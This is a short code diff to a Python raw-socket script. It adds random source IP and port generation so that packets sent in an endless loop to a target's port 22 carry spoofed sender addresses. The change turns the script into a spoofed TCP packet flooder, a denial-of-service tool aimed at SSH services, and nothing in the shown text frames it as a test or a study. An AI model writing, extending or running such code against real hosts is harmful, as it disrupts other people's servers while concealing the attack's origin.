@@ -1,6 +1,7 @@
 import array
 import socket
 import struct
+import random
 
 def chksum(packet: bytes) -> int:
     if len(packet) % 2 != 0:
@@ -12,6 +13,11 @@ def chksum(packet: bytes) -> int:
 
     return (~res) & 0xffff
 
+def randomIP():
+    return f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
+
+def randomPort():
+    return random.randint(1,50000)
 
 class TCPPacket:
     def __init__(self,
@@ -60,13 +66,11 @@ if __name__ == '__main__':
 
     while True:
         pak = TCPPacket(
-            '10.10.10.227',
-            3124,
+            randomIP(),
+            randomPort(),
             dst,
             22,
             0b000101001
         )
-
         s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-
         s.sendto(pak.build(), (dst, 0))
